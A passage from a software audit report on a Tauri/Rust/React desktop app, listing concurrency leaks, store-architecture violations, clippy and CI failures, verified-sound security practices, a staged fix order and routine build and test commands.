- **Failure scenario:** Functional, but guarantees one extra fetch after all jobs finish and
  churns timers continuously.
- **Fix:** Depend on a stable value, or move polling to React Query's `refetchInterval`.

### FE-12 — Zustand SSOT audit: 6 of 11 stores violate `CLAUDE.md` rule 3
- **Severity:** P2 (architectural) · **Verified:** READ
- **Location:** `src/app/websrc/stores/`

| Store | Verdict |
|---|---|
| `settingsStore.ts` | **OK** — pure UI prefs (theme/font). Exemplary; use as the reference. |
| `toastStore.ts` | **OK** — ephemeral UI. |
| `progressStore.ts` | **OK** — ephemeral event state. |
| `vaultImportStore.ts` | **OK** — pure UI tick counter. |
| `modelWarmupStore.ts` | **OK** — ephemeral. |
| `downloadedModelsStore.ts` | **VIOLATION** — mirrors `DownloadedModelRepository`, which is the rule's *own* canonical SSOT example, with setters and clear/repopulate. Consumers gate chat submit on it (`ChatPanel.tsx:362`). |
| `downloadStore.ts` | **VIOLATION** — `useDownloads.ts` hand-rolls the "drop stale entries" reconcile **three separate times** (lines 84-102, 198-218, 316-335) — precisely the drift ceremony rule 3 says React Query eliminates. |
| `conversationsStore.ts` | **VIOLATION** — mirrors SQL conversations/messages with manual optimistic rollback (`deleteMessage` 1142-1178, `deleteConversation` 1215-1223); rule 3 explicitly names this "paper compliance". |
| `modelCatalogStore.ts` | **VIOLATION (mild)** — hand-rolled query cache with manual request-id race guards (lines 102-104). |
| `fileBrowserStore.ts` | **PARTIAL VIOLATION** — `savedViews`/`savedSearches`/`customCollections` are legitimately client-only, but `sourceConnections` (465-499, 1315-1391) persists local-folder/watch-source state to localStorage and `reconcileLocalSources` merges backend state into it — a second source of truth for watch folders, which Task 7 deliberately moved into the Rust `SettingsRepository`. |
| `ChatPanel` localStorage | **VIOLATION** — see `FE-9`. |

- **Fix:** Migrate the violating stores to React Query per the canonical pattern in
  `hooks/queries/useSettingsQuery.ts` / `useConfigQuery.ts`. Sequence by risk:
  `downloadedModelsStore` and `downloadStore` first (smallest, and they fix `FE-4` and the
  triple-reconcile at the same time), then `modelCatalogStore`, then `fileBrowserStore`'s
  `sourceConnections`, and `conversationsStore` last (largest, and entangled with `FE-2`,
  `FE-3`, `FE-8`). See `ARCH-2`.

**Verified clean in this subsystem:** the classic `listen()`-promise bug is handled **correctly**
in `useVaultWriteErrorListener.ts`, `useVaultImportListener.ts`, `useModelWarmupListener.ts`,
`useVaultFocusRescan.ts`, and `useDownloads.ts` — copy that pattern for the fixes above.
Module-level timers in `progressStore`/`toastStore`/`downloadStore` are tracked and cleared
(HMR-guarded). `useJournalNote` correctly flushes debounced saves on unmount and on
visibility-hidden. React Query usage in `useSettingsQuery`, `useDashboardQuery`,
`useChatEmptyStateStats`, and `useSearchQuery` is clean — stable keys, mutations writing back
via `setQueryData`. `key={index}` occurrences are confined to skeletons and static string
lists. **Frontend XSS posture is genuinely good** — see Section 13.

---

## 11. Concurrency, memory, and resource leaks

Two of this subsystem's findings are filed in Section 6 because their consequence is a
download bug; they are listed here as stubs so the numbering has no gaps.

### CONC-1 — Paused downloads never release their concurrency slot
> Same defect as `DL-2`. See Section 6.

### CONC-3 — Detached progress tasks race terminal state transitions
> Same defect as `DL-3`. See Section 6.

### CONC-2 — Timed-out child processes are never killed (orphaned whisper/yt-dlp)
- **Severity:** P1 · **Verified:** READ
- **Location:** `src/app/src/src/features/web/services/ingestion.rs:733-761`, `:843-866`,
  `:1126-1148`
- **Root cause:** `tokio::process::Command::output()` wrapped in `tokio::time::timeout`
  **without `kill_on_drop(true)`**. When the timeout fires the future is dropped, but the child
  process keeps running.
- **Failure scenario:** Whisper ASR exceeds `asr_timeout_secs` on a long video. Lattice reports
  "timed out"; the user retries. Orphaned `whisper` / `yt-dlp` processes accumulate, each
  burning a full CPU core for hours and writing into a temp directory that may already have
  been deleted — disk space stays pinned until the orphan exits. Repeat retries multiply it.
- **Fix:** Add `.kill_on_drop(true)` to every `Command` that can be raced by a timeout, and
  prefer explicitly `kill().await` + `wait().await` on the timeout branch so the process is
  reaped rather than left as a zombie.
- **Verify:** Trigger an ASR timeout; assert no `whisper` process survives (`pgrep`).

### CONC-4 — Tag service accumulates a per-document mutex forever
- **Severity:** P2 · **Verified:** READ
- **Location:** `src/app/src/src/features/tags/service.rs:47,59-65`
- **Root cause:** `document_locks: HashMap<String, Arc<Mutex<()>>>` inserts a mutex on first
  tag operation per document and **never evicts**.
- **Failure scenario:** Monotonic growth with every distinct document ever tagged. Small per
  entry, but unbounded across a long session over a large corpus.
- **Fix:** Evict when the `Arc` strong count drops to 1, or use a bounded LRU, or key a
  striped lock array by hash (simplest — fixed memory, no eviction logic).

### CONC-5 — Reranker init failure latches permanently
- **Severity:** P2 · **Verified:** READ
- **Location:** `src/app/src/src/features/conversation/chat/retrieval/rerank.rs:110-131`
- **Root cause:** `RERANKER_INIT_FAILED` latches on the first failed init — e.g.
  `model.safetensors` present but still mid-download or corrupt at first chat. Reranking then
  stays silently disabled until app restart even after the model becomes valid. Two callers can
  also race the two lock windows and both load the model (the loser is dropped — transient
  double RAM).
- **Fix:** Make the latch time-bounded (retry after N minutes) or clear it on
  model-download-completed events. Collapse the two lock windows into one so concurrent callers
  await a single load.

### CONC-6 — Per-turn summarization spawns unbounded duplicate LLM work
- **Severity:** P2 · **Verified:** READ · closely related to `CHAT-7`
- **Location:** `src/app/src/src/features/conversation/summarizer.rs:142-161`
- **Root cause:** `spawn_refresh_summary` spawns a detached LLM summarization per chat turn
  with no dedup or coalescing.
- **Failure scenario:** User sends N messages quickly while the local LLM is slow → N concurrent
  full-history summarizations of the same conversation queue behind the sidecar, each holding a
  cloned message `Vec`. Last-writer-wins on the summary row makes all but one pure waste — and
  per `CHAT-7`, **nothing reads the result at all**.
- **Fix:** Coalesce per conversation (drop a pending refresh if one is already in flight, or
  debounce). Resolve `CHAT-7` first — if summaries are unused, delete the producer instead of
  optimizing it.

### CONC-7 — Concurrent model loads can double model RAM
> Same as `DL-8`. See Section 6.

**Verified clean in this subsystem** (checked by reading drop/exit paths, not just grep hits):
- **Caches are bounded.** `LlmCache` and `QUERY_CACHE` are capacity-bounded `LruCache`s.
  Embedding/LLM/router caches in the container hold at most one entry.
- **No lock guard is held across an `.await`** anywhere in the audited paths; lock discipline
  is guard-in-block throughout.
- **Sidecar lifecycle is well engineered** (`sidecar_manager.rs`): kill-on-drop, a sync registry
  `kill_all`, a Windows Job Object, and a drain task that exits when the event channel closes.
- **Long-lived loops all have shutdown paths.** Sagas and the event bridge run under
  `supervise_cancellable` with a `CancellationToken`; the backup scheduler aborts its old task
  on restart/stop; the indexing actor has a bounded queue and a joined shutdown (though see
  `IDX-6` for the cancel bug).
- **Unbounded channels all have dedicated drainers.** Vault writer/watcher and download-event
  channels are drained by long-lived consumers (`infrastructure/setup/app.rs:566-587`); the
  conversation command channel is bounded with backpressure.
- **No Tauri event listeners are registered in Rust at all** (`app.listen` count: zero), and
  cancellation-registry entries are removed via a Drop guard (`chat.rs:85-102`).
- **Blocking work is correctly offloaded.** Audio file scans and transcript reads go through
  `spawn_blocking`; the remaining `std::fs` calls in async paths are cheap metadata/`read_dir`
  on small directories.
- **No Arc reference cycles found.**

---

## 12. Architectural debt

These are not individual bugs but the conditions that produced clusters of the bugs above.
Fixing them is how the same bugs stop coming back.

### ARCH-1 — The Repository Barrier guard cannot see most violations
- **Severity:** P2 · **Verified:** RUN (read the script; it passes, correctly, but narrowly)
- **Location:** `scripts/check-repository-barrier.sh:12,45-46`
- **Root cause:** The guard only searches files matching `*/use_cases/*.rs`, and within those it
  only greps for `read_dir`. It therefore cannot see:
  - Raw SQL and filesystem state decisions in `commands.rs`, `watcher.rs`, `service.rs`,
    `repository.rs` — which is where `SET-6`, `DATA-3`, and `SQL-4` actually live.
  - Other filesystem-state predicates: `try_exists`, `metadata`, `is_file`, `is_dir`, `exists`.
  - `CLAUDE.md` rule 2 ("no use case may issue raw SQL") — not checked at all.
- **Failure scenario:** The guard reports "clean" while the codebase contains multiple live
  split-brain bugs, which is worse than having no guard, because it manufactures confidence.
  `DATA-3`, `IDX-2`, `SET-6`, and `SQL-6` are all instances of the exact pattern the rule
  targets, and all passed.
- **Fix:** Broaden the file glob to all of `features/**`, add the other filesystem predicates,
  and add a `sqlx::query` check for `use_cases/`. Accept that grep will over-report and rely on
  the existing inline-justification comment mechanism. Longer term, `CLAUDE.md` already notes
  the real answer: module-system enforcement (make the pool private to
  `infrastructure::persistence`, expose only repository traits).

### ARCH-2 — Zustand→React Query migration is half-done
- **Severity:** P2 · **Verified:** READ · detail in `FE-12`
- **Root cause:** Phase 4b successfully converted `settingsStore`, but six stores still mirror
  backend state, and `useDownloads.ts` hand-rolls the same reconcile three times. The rule is
  documented and the canonical pattern exists — the migration simply stopped partway.
- **Fix:** See `FE-12` for the recommended sequence. Add a lint rule (or a review checklist
  item) forbidding new Zustand stores that import from `lib/api.ts`.

### ARCH-3 — Hand-written TS DTOs are drifting (rule 5 never implemented)
- **Severity:** P2 · **Verified:** RUN (this drift is 10 of the 18 `tsc` errors)
- **Root cause:** `CLAUDE.md` rule 5 says TS types for backend DTOs "should be generated, not
  hand-written… When manually maintained, they drift", and tracks codegen as a follow-up that
  was never done. `BLD-7` and `CHAT-8` are that prediction coming true: nine type names in
  `api.ts` that no backend type corresponds to, and seven exported API functions with no
  backend command.
- **Fix:** Adopt `ts-rs` or `specta` for the DTO layer. There is already a
  `websrc/lib/bindings.ts` and an `export_bindings.rs` — determine whether that pipeline is
  live and finish it rather than starting a third mechanism. Until then, `CHAT-8`-style phantom
  APIs will keep appearing.

### ARCH-4 — Core primitives are implemented two or three times
- **Severity:** P2 · **Verified:** READ
- **Root cause:** A recurring pattern behind several P0/P1 bugs — the same primitive written
  more than once, with the copies disagreeing:
  | Primitive | Copies | Consequence |
  |---|---|---|
  | Embedding BLOB encode/decode | 2 (bincode, raw LE) | `IDX-2` — silent search loss |
  | SSRF/URL validation | 2 (`web.rs` correct, `update.rs` inadequate) | `SEC-7` |
  | Vector-index entry key | 2 (`emb_{chunk_id}`, bare UUID) | `IDX-8` — undeletable vectors |
  | Schema definition | 3 (`init_schema.sql`, migrations, `schema.sql`) | `SQL-6` |
  | `daily_notes_workspace` writer | 2 (commands, watcher) | `DATA-3`, `SET-1` |
  | Atomic-write temp naming | 2 (vault correct, settings unsafe) | `DATA-5` |
  | `LIKE` escaping | 0 correct, 3 sites needing it | `DATA-2`, `SQL-10` |
  | Context-window size | 2 (adapter 8192, manager 2048–4096) | `CHAT-3` |
- **Fix:** For each row, delete the weaker copy and route all callers through the stronger one.
  This is the single highest-leverage cleanup in the document: eight rows, eight bugs, and the
  fixes are mostly mechanical once the canonical implementation is chosen.

---

## 13. Code hygiene and tooling

### HYG-1 — 26 deny-level clippy violations (these fail CI)
- **Severity:** P1 · **Verified:** RUN (`cargo clippy --lib`)
- **Root cause:** The crate defines deny-level lints for `unwrap`/`expect`/`panic`/
  `indexing_slicing` (per the comment in `.github/workflows/ci.yml:67-70`), and 26 sites
  violate them. These are reported as **errors**, not warnings, so `cargo clippy --all-targets`
  in CI fails. Full list, with exact locations:

  **`indexing may panic` (19):**
  | Location |
  |---|
  | `src/domain/value_objects/chunking_strategy.rs:95:19` |
  | `src/features/conversation/chat/retrieval/external_query.rs:164:16` |
  | `src/features/conversation/chat/retrieval/external_query.rs:232:9` |
  | `src/features/conversation/chat/retrieval/keyword.rs:119:15` |
  | `src/features/conversation/chat/retrieval/rerank.rs:162:13` |
  | `src/features/conversation/chat/retrieval/rerank.rs:173:28` |
  | `src/features/conversation/chat/retrieval/result_filters.rs:191:9` |
  | `src/features/conversation/chat/verification.rs:144:12` |
  | `src/features/conversation/chat/verification.rs:147:38` |
  | `src/features/conversation/chat/verification.rs:151:48` |
  | `src/features/conversation/chat/verification.rs:157:18` |
  | `src/features/conversation/chat/verification.rs:175:12` |
  | `src/features/conversation/chat/verification.rs:182:34` |
  | `src/features/conversation/chat/verification.rs:183:25` |
  | `src/features/conversation/chat/verification.rs:187:53` |
  | `src/features/qa/use_cases/ask_question.rs:739:26` |
  | `src/features/search/engine/reranker.rs:446:35` |
  | `src/shared/modules/text_utils.rs:176:21` |
  | `src/shared/modules/text_utils.rs:185:21` |

  **`slicing may panic` (4):**
  | Location |
  |---|
  | `src/features/embedding/candle_service.rs:629:18` |
  | `src/features/search/engine/reranker.rs:345:22` |
  | `src/features/qa/hyde/hyde_generator.rs:192:5` |
  | `src/shared/modules/text_utils.rs:195:27` |

  **`unwrap()`/`expect()` on a `Result` (4):**
  | Location |
  |---|
  | `src/features/web/di.rs:84:22` |
  | `src/features/web/di.rs:87:22` |
  | `src/features/web/di.rs:90:22` |
  | `src/features/web/di.rs:99:15` (`expect`) |

- **Failure scenario:** Most of these operate on model output or retrieved document content —
  i.e. externally-influenceable data — so they are latent panics on the chat hot path, the same
  family as the confirmed live panic in `CHAT-1`. The four in `features/web/di.rs` are at DI
  construction time (startup crash rather than request crash).
- **Fix:** Prioritize `chat/verification.rs` (8 sites) and `chat/retrieval/` (5) — those are on
  the request path for untrusted input. Replace indexing with `get()`/`get(..)` plus explicit
  handling. `text_utils.rs:176-195` is especially worth fixing carefully: it is the module that
  *provides* safe truncation helpers to the rest of the codebase (`CHAT-1`), so a panic there
  undermines every caller.
- **Verify:** `cargo clippy --all-targets` exits 0.

### HYG-2 — CI is red on every job, and has been treated as advisory
- **Severity:** P1 · **Verified:** RUN (each command run locally; workflow read)
- **Location:** `.github/workflows/ci.yml`
- **Root cause:** CI enforces `cargo check --all-targets`, `cargo clippy --all-targets`,
  `cargo fmt --check`, the repository-barrier script, `npm run type-check`, `npm run lint`, and
  `npm test -- --run` — **with no `continue-on-error` on any step**. Every one of those
  (except `fmt` and the barrier script) fails on the current tree. Supporting evidence that
  lint output has been ignored for a while: `package.json` pins
  `eslint … --max-warnings 501`.
- **Failure scenario:** The safety net exists and is fully wired, but is red, so it has stopped
  functioning as a gate. Every issue in this document reached the branch through it.
- **Fix:** Get CI green as the definition of done for Section 2, then keep it green. Once
  `HYG-1` is burned down, flip on `-D warnings` as the workflow comment already anticipates,
  and ratchet `--max-warnings` downward.

### HYG-3 — `lattice/` is a stale 31 MB untracked duplicate of the whole repo
- **Severity:** P2 · **Verified:** RUN (`du -sh`, `diff -rq` shows divergence)
- **Location:** `/Users/josh/Code/lattice-temp/lattice/`
- **Root cause:** A complete second copy of the repository, untracked (`?? lattice/` in
  `git status`), 31 MB, which **diverges** from the live tree (`Cargo.toml`, `build.rs`,
  `package-lock.json`, and many source files all differ).
- **Failure scenario:** Three real risks: (1) it gets committed by a broad `git add`;
  (2) someone edits or greps the wrong copy and draws wrong conclusions (during this audit it
  was necessary to explicitly exclude it from every search); (3) it is the only place some
  files exist — notably `websrc/lib/__mocks__/api.ts`'s missing `vaultApiMock` dependency
  (`BLD-4`).
- **Fix:** Before deleting, **mine it for the stranded work**: check whether it contains the
  missing `components/Downloads/` files from `BLD-1` and the missing test mocks from `BLD-4`.
  Then delete it, and add `lattice/` to `.gitignore` if this copy pattern recurs.
- **Note:** During this audit a stub sidecar binary was created at
  `src/app/src/binaries/llama-server-aarch64-apple-darwin` (see `BLD-3`) — it is gitignored but
  must be removed or replaced.

### HYG-4 — Doc comments that actively misdescribe the code
- **Severity:** P2 · **Verified:** READ
- **Root cause:** A recurring pattern worth treating as a class, because in several cases the
  comment is what would stop a reviewer from finding the bug:
  | Location | Claims | Reality |
  |---|---|---|
  | `features/settings/repository.rs:15` | "proper locking" | no locking at all (`DATA-4`) |
  | `interfaces/di/container.rs:1498` | roots are "lattice + indexed directories" | entire home dir (`SEC-5`) |
  | `features/download/engine.rs:800-810` | "Errors: ValidationFailed if size mismatch" | warns and keeps the file (`DL-10`) |
  | `features/credentials/use_cases/set_custom_endpoint.rs:9` | "Validates URL format" | no validation (`SEC-13`) |
  | `features/file/commands.rs:420` | "prevent SQL injection" | true, but the actual bug is wildcards (`DATA-2`) |
  | `features/indexing/engine/transaction.rs` guard | cleans up on failure | permanent no-op (`IDX-12`) |
  | `features/conversation/commands.rs:105` | references deleted commands | stale after `CHAT-0` |
- **Fix:** Correct each comment as its bug is fixed. Where a comment describes an invariant,
  prefer a test or a type that enforces it over prose.

### HYG-5 — 84 clippy warnings in the library
- **Severity:** P3 · **Verified:** RUN
- **Root cause:** Beyond the deny-level errors, the lib emits 84 warnings. The most common,
  with counts: `empty line after doc comment` (17), `doc list item without indentation` (11),
  `redundant closure` (8), `this impl can be derived` (5), `this map_or can be simplified` (4),
  `explicit call to .into_iter()` (4), `very complex type used` (3), `unneeded return` (3),
  `too many arguments` (3 at 11/10, 2 at 14/10, 1 at 13/10),
  `this repeat().take() can be written more concisely` (3), `consider using sort_by_key` (3),
  `value assigned to timings is never read` (2), `unwrap_or_else to construct default` (2, both
  in `chat.rs:729,738`), plus singletons (`Box<Vec<..>>`, `&Box<T>`, `&PathBuf` instead of
  `&Path`, `useless conversion to AppError`, `loop variable used to index`, `large size
  difference between variants`, missing `Default` impls for `ProfileRotator`/`PauseGate`/
  `AuthManager`).
- **Fix:** `cargo clippy --fix` handles a large fraction mechanically. Do this **after** the
  correctness work, in its own commit, so it does not obscure behavioral diffs. Two are worth
  a real look rather than an autofix: `value assigned to timings is never read` (×2) may
  indicate dead measurement code, and `large size difference between variants` is a real
  memory consideration for a hot enum.

### HYG-6 — Dead trees: `src/api/` (Python) and `api-rust/`
- **Severity:** P3 · **Verified:** RUN (grep found no references from the app)
- **Root cause:** Neither is referenced by `tauri.conf.json` or the build scripts, and nothing
  in `websrc/` or the Rust backend calls a localhost HTTP API (the only `localhost` hits are in
  `features/web` mocks and stealth-header code). `src/api/` still carries Alembic configs,
  Dockerfiles, k8s manifests, and a `csrf_audit_report.json` — an entire abandoned web-service
  architecture. `api-rust/` has its own CI job.
- **Failure scenario:** Not a runtime risk. It is a comprehension and search cost: an auditor
  or new contributor cannot tell what ships. It also makes the repo's dependency and
  vulnerability surface look far larger than it is.
- **Fix:** Confirm both are dead (check whether `api-rust` is a real sync-engine roadmap item —
  its CI job suggests it may be), then delete or move to a clearly-labeled `archive/` or a
  separate repository.

### HYG-7 — Stray `commit-msg.txt` in the repo root
- **Severity:** P3 · **Verified:** RUN (`ls`)
- **Fix:** Delete it, or add it to `.gitignore` if it is a working file for a commit helper.

---

## 14. What is solid — do not spend effort here

Recorded deliberately so remediation effort is not wasted re-auditing healthy code. Each item
below was actively checked during this audit and found correct.

**Security posture (the parts that are right):**
- **Web-fetch SSRF defense** (`features/web/services/web.rs:909-1005`, `:1177-1181`) is
  genuinely well built: IP-literal checks, pre-request DNS resolution validating **all**
  answers, IPv6 ULA/link-local/multicast handling, AWS metadata v4 and v6, and post-redirect
  final-URL re-validation. **This is the implementation `SEC-7` should reuse.**
- **No command injection anywhere.** Every `Command::new` uses argv arrays; `yt-dlp` is invoked
  with a `--` terminator before the URL (`ingestion.rs:733`, `:1126`); binary names come from
  in-code config, never from settings or IPC; `show_in_folder` passes `OsStr` args.
- **Credentials are stored in the OS keyring** (`features/credentials/adapter.rs:84-130`).
  `credentials.json` holds only the endpoint. No key values are logged (only `key_exists`).
- **Frontend XSS posture is strong.** Zero `dangerouslySetInnerHTML` / `innerHTML` in the
  codebase. Fetched-article and DOCX HTML render in `sandbox="allow-same-origin"` iframes
  **without** `allow-scripts` (`HTMLViewer.tsx:194`, `DocxViewer.tsx:106`). LLM/chat markdown
  goes through Tiptap 3.20 with `html: false` and the library's default URI allowlist, so
  `javascript:` URLs are blocked. This matters a lot in Tauri, where renderer XSS means full
  IPC access.
- **No SQL injection.** All queries parameterized; no user input interpolated into SQL anywhere.
- **No zip-slip.** Archives (docx/xlsx/pptx/odt) are only read in memory for text extraction —
  nothing is extracted to disk.
- **App updates are notification-only**, so there is no unsigned-artifact-execution path today.

**Runtime engineering:**
- **Sidecar process lifecycle** is the best-engineered part of the codebase: kill-on-drop, a
  synchronous registry `kill_all`, a Windows Job Object, and a drain task that terminates when
  its event channel closes.
- **SQLite pool configuration** is right for a desktop app: WAL, `busy_timeout(5s)`,
  `synchronous=NORMAL`, 5 connections, FK enforcement — and embeddings are computed before
  transactions open, so the happy path holds no long write locks.
- **FTS trigger coverage** is complete across insert/update/delete including title-only
  updates, and FK cascade deletes were **empirically confirmed** to fire `AFTER DELETE`
  triggers, so cascades do not orphan FTS rows.
- **Cache bounds and lock discipline:** all caches are LRU-bounded, and no lock guard is held
  across an `.await` anywhere in the audited code.
- **Shutdown paths exist** for every long-lived task (sagas, event bridge, backup scheduler,
  indexing actor), and every unbounded channel has a dedicated long-lived drainer.
- **Migration mechanics** are sound: sequential versioning, idempotent `INSERT OR IGNORE`
  seeds, the `20260501` `ModelLocation` backfill (including its `substr` config.json-stripping
  and `__missing_after_migration__` sentinel), and repair migrations that cannot abort because
  `space_general` is undeletable.
- **Extraction robustness:** huge and non-UTF8 files are handled with 50 MB caps and error
  returns rather than panics.
- **Retrieval math** is correct: sort directions, score thresholds, and fusion/BM25/USearch
  ranking all check out.
- **The correct Tauri listener pattern is already in the codebase** —
  `useVaultWriteErrorListener`, `useVaultImportListener`, `useModelWarmupListener`,
  `useVaultFocusRescan`, and `useDownloads` all handle the `listen()` promise properly. Copy
  them for `FE-1`, `FE-6`, `FE-7`.
- **`settingsStore.ts`** is the reference implementation for `CLAUDE.md` rule 3.
- **`first_run_setup.rs`** is clean — pure repository reads, no filesystem walks. The Phase 3
  fix held.
- **The uncommitted `commands.rs` deletion is safe to commit** (`CHAT-0`).

---

## 15. Recommended execution order

The ordering is driven by dependencies, not just severity — several fixes cannot be verified
until earlier ones land.

### Stage 0 — Restore the ability to verify anything (blocking)
`BLD-1` → `BLD-2` (automatic) → `BLD-3` → `BLD-4` → `BLD-5`, then `HYG-3` (mine `lattice/`
for the stranded files first, then delete it). **Exit criterion: `vite build`, `cargo check
--all-targets`, `cargo test`, and `npx vitest run` all execute.** Expect newly-visible test
failures; triage them into this document as `TEST-n` before proceeding.

### Stage 1 — Stop data loss (no user-facing work should ship before this)
`DATA-2` + `SQL-7` (same function) → `DATA-3` → `DATA-4` + `DATA-5` + `DATA-9` (same file,
one change set) → `DATA-6` → `IDX-3` → `SET-4` (silent backup failure is data loss in waiting)
→ `DATA-8`.

### Stage 2 — Close the exploitable holes
`SEC-1` → `SEC-2` → `SEC-3` + `SEC-10` (same pattern) → `SEC-4` → `SEC-5` → `SEC-8` (deletion,
trivial) → `SEC-6` (needs a UX decision — see note below) → `SEC-7` (fold into `ARCH-4`)
→ `SEC-9`.

### Stage 3 — Make indexing and search actually work
`IDX-1`/`SQL-1` first (nothing else in the pipeline is testable while re-index fails) →
`IDX-2` (with its data migration) → `IDX-4` (one-word fix, do it with `IDX-2`) → `IDX-8` →
`IDX-5` → `IDX-6` → `SQL-4` (the 5-second-per-document stall) → `IDX-7` → `IDX-9` → `IDX-10`
→ `IDX-11` → `IDX-12`/`SQL-5`.

### Stage 4 — Make downloads and chat trustworthy
Downloads: `DL-1` + `DL-2` + `DL-3` together (they interact; fixing one alone will look like
it didn't work) → `DL-4` → `DL-7` → `DL-5` → `DL-6`.
Chat: `CHAT-1` (trivial, do it immediately) → `CHAT-9` + `FE-2` + `FE-3` (one change set) →
`CHAT-3` → `CHAT-2` → `CHAT-5` + `FE-8` (one change set) → `CHAT-6` → `CHAT-7` + `CONC-6`
(decide: wire up or delete) → `CHAT-8` + `CHAT-4` (deletions).

### Stage 5 — Frontend leaks and correctness
`FE-1` → `FE-4` → `FE-6` → `FE-5` → `FE-7` → `FE-10` → `FE-11`.

### Stage 6 — Remaining correctness and consistency
`SET-1` → `SET-2` → `SET-3` → `SQL-3` → `SQL-6` (do before any sqlx cache regeneration) →
`SQL-11` → `SQL-8` → `SQL-9` → `SQL-10` → `CONC-2` → `CONC-4` → `CONC-5` → `DL-8` → `DL-9`
→ `DL-10` → `DL-11` → `DL-12` → `SEC-11` → `SEC-12`.

### Stage 7 — Pay down the debt that caused the clusters
`ARCH-4` (the eight duplicated primitives — much of this is already done incidentally by
Stages 1–4; finish it deliberately) → `ARCH-1` (widen the guard so regressions are caught) →
`ARCH-3` (DTO codegen) → `ARCH-2` / `FE-12` (Zustand migration, in the sequence given) →
`SET-6` (`DailyNotesRepository`) → `HYG-1` → `HYG-2` (turn CI green and keep it green) →
`HYG-4` → `HYG-5` → `HYG-6` → `HYG-7`.

### Decisions that need the repo owner, not the implementing agent
1. **`BLD-1`** — do the three `Downloads/` components exist on the other machine, or must they
   be written from scratch? This gates everything.
2. **`SEC-6`** — how much friction is acceptable on model-initiated web fetches? A confirmation
   prompt is the safe answer but changes the product's feel.
3. **`CHAT-7`/`CONC-6`** — should conversation summarization be finished or removed?
4. **`SET-4`** — are user-chosen backup paths supported or not?
5. **`HYG-6`** — is `api-rust` a live roadmap item (its CI job suggests maybe) or dead?
6. **`ARCH-2`** — appetite for the `conversationsStore` migration, which is genuinely large.

---

## 16. Appendix — verification commands

Run from `/Users/josh/Code/lattice-temp` unless noted.

```bash
# Frontend
cd src/app
npm ci
npx vite build                 # BLD-1 gate
npm run type-check             # BLD-7
npm run lint                   # BLD-6
npx vitest run                 # BLD-4

# Rust  (requires src/app/src/binaries/llama-server-<triple> to exist — BLD-3,
#        and a built ../dist for the bin target — BLD-2)
cd src/app/src
cargo check --all-targets      # BLD-5
cargo clippy --all-targets     # HYG-1  (deny-level lints; must exit 0)
cargo fmt --all -- --check
cargo test

# Project rules
cd /Users/josh/Code/lattice-temp
bash scripts/check-repository-barrier.sh   # note ARCH-1: passes but sees little
```

### Environment notes captured during this audit
- Platform: macOS (Darwin 25.5.0), aarch64. Target triple `aarch64-apple-darwin`.
- `SQLX_OFFLINE = "true"` in `src/app/src/.cargo/config.toml:25`; 101 cached queries in
  `src/app/src/.sqlx/`. See ground rule 1 before touching any `sqlx::query!` SQL.
- `src/app/src/binaries/` contains only `README.md` and `.gitignore`. A stub sidecar was used
  temporarily to gather the Rust tool output quoted here and was then removed, so
  `cargo check` will fail on the missing resource until you supply a real one (`BLD-3`).
- Vite 5.4.21, vitest 4.x, ESLint 10.x, Tauri v2.
- Full local run output (build/lint/test logs referenced throughout) was produced on
  2026-07-29 against HEAD `38993ea` plus the uncommitted working-tree changes to
  `features/conversation/commands.rs` and `gen/schemas/macOS-schema.json`.

### Audit method and confidence
Eight parallel subsystem audits (Rust concurrency/leaks, chat/LLM, indexing/search,
download/model management, settings/vault/backup, React frontend, SQL/migrations, security),
each instructed to verify by reading callers and callees rather than pattern-matching, and to
report only defects it could trace to a concrete failure scenario. Every `RUN`-tagged claim was
executed locally. Cross-validation was informative: `IDX-1` was found independently by the
indexing and SQL audits (the latter confirming it empirically against SQLite 3.51), `DL-2`/`DL-3`
by the download and concurrency audits, and `CHAT-9`/`FE-2` from opposite ends of the same
event channel. Findings tagged `READ` are high-confidence but were not executed — **re-confirm
each before writing its fix**, since line numbers will drift as earlier stages land.

**Known gaps in this audit** (not covered; consider a follow-up):
- No runtime/dynamic analysis — no profiler, no leak detector under real load, no fuzzing.
- No end-to-end Playwright run (`test:e2e` was not exercised).
- Rust test *content* was not reviewed for quality, only for whether it compiles (`BLD-5`).
- `src/api/` (Python) and `api-rust/` were explicitly out of scope (`HYG-6`).
- Accessibility, i18n, and visual/UX review were out of scope.
- Dependency vulnerability scanning (`cargo audit` / `npm audit`) was not run.
